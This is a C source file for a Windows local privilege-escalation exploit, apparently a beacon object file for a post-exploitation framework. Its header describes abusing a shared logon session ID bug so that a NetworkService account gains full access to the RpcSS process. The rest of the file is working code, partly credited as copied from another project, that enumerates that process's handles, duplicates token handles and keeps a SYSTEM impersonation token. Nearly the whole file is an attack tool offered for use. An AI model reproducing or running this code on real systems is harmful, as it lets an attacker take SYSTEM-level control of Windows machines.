/*!
 *
 * Network Service Exploit: Abuses the shared logon
 * session ID bug documented by James Forshaw that
 * permits a NetworkService account to acquire a
 * session ID matching RpcSS service, allowing it to
 * open the process with ALL_ACCESS handle.
 *
 * Using this access, the attacker may be able to
 * enumerate any active handles open within the 
 * process, and steal any SYSTEM tokens available to
 * it.
 *
 * For the bug to work properly, the attacker must
 * create a named pipe server handle and access it
 * from the local NPFS redirection using localhost 
 * as the server name.
 *
!*/
#include "common.h"

//
// Code Ripped From Ionescu's "FaxHell" Project
//
static
ULONG 
TokenObjectIndex( VOID )
{
	HANDLE   hToken = NULL;
	BOOL     Result = FALSE;
	ULONG    tIndex = 0;
	NTSTATUS Status = STATUS_SUCCESS;
	struct {
		C_OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[sizeof("Token")];
	} ObInfo;

	/*++
	 *
	 * Opens the current process token to acquire
	 * the object index, in an attempt to identify
	 * the id for any valid token handles found
	 * with NtQueryInformationProcess().
	 *
	--*/
	Result = ADVAPI32$OpenProcessToken( NtCurrentProcess(), 
										MAXIMUM_ALLOWED, 
										&hToken );

	if ( Result != TRUE ) {
		goto Failure;
	};

	Status = NTDLL$NtQueryObject( hToken,
								  ObjectTypeInformation,
								  &ObInfo,
								  sizeof(ObInfo),
								  NULL );

	if ( !NT_SUCCESS(Status) ) {
		goto Failure;
	};

	tIndex = ObInfo.TypeInfo.TypeIndex;

Failure:
	if ( hToken != NULL ) {
		KERNEL32$CloseHandle( hToken );
	};

	return tIndex;
};

//
// Code Ripped From Alex Ionescu's FaxHell
//
HANDLE
TokenGetSystemTokenFromProcess(
	IN HANDLE hProcess
	)
{
	ULONG                                oIndex = 0;
	ULONG                                InfLen = 0;
	ULONG                                RetLen = 0;
	HANDLE                               hToken = NULL;
	NTSTATUS                             Status = STATUS_UNSUCCESSFUL;
	LUID                                 System = SYSTEM_LUID;
	BOOL                                 RetVal = FALSE;
	TOKEN_STATISTICS                     tStats = { 0 };
	PROCESS_HANDLE_SNAPSHOT_INFORMATION  lhInfo = { 0 };
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION phInfo = &lhInfo;

	/*++
	 *
	 * Acquires the token object index to identify
	 * any open tokens within a process, and then
	 * tries to identify its type, and user. If the
	 * token is an impersonation and a SYSTEM token,
	 * it will return it back to the caller.
	 *
	--*/
	oIndex = TokenObjectIndex();
	if ( oIndex != 0 ) {
		Status = NTDLL$NtQueryInformationProcess( hProcess,
												  ProcessHandleInformation,
												  phInfo,
												  sizeof( *phInfo ),
												  &RetLen );

		if ( NT_SUCCESS(Status) ) {
			goto Failure;
		};

		RetLen += 16 * sizeof(*phInfo);
		phInfo  = KERNEL32$LocalAlloc(LPTR, RetLen);

		Status = NTDLL$NtQueryInformationProcess( hProcess,
												  ProcessHandleInformation,
												  phInfo,
												  RetLen,
												  NULL );

		if ( !NT_SUCCESS(Status) ) {
			goto Failure;
		};

		for ( ULONG i = 0 ; i < phInfo->NumberOfHandles ; ++i ) {
			if ( ( phInfo->Handles[i].GrantedAccess == TOKEN_ALL_ACCESS ) &&
				 ( phInfo->Handles[i].ObjectTypeIndex == oIndex ) ) 
			{
				RetVal = KERNEL32$DuplicateHandle( hProcess,
												   phInfo->Handles[i].HandleValue,
												   NtCurrentProcess(),
												   &hToken,
												   0,
												   FALSE,
												   DUPLICATE_SAME_ACCESS );

				if ( RetVal ) {

					RetVal = ADVAPI32$GetTokenInformation( hToken,
														   TokenStatistics,
														   &tStats,
														   sizeof(TOKEN_STATISTICS),
														   &RetLen );

					if ( RetVal ) {
						if ( (*(PULONGLONG)&tStats.AuthenticationId ==
							  *(PULONGLONG)&System) )
						{
							if ( tStats.PrivilegeCount >= 22 ) {
								break;
							};
						};
					};
					KERNEL32$CloseHandle( hToken );
					hToken = NULL;
				};
			};
		};
	};

Failure:
	if ( phInfo != NULL && phInfo != &lhInfo )
		KERNEL32$LocalFree(phInfo);

	return hToken;
};

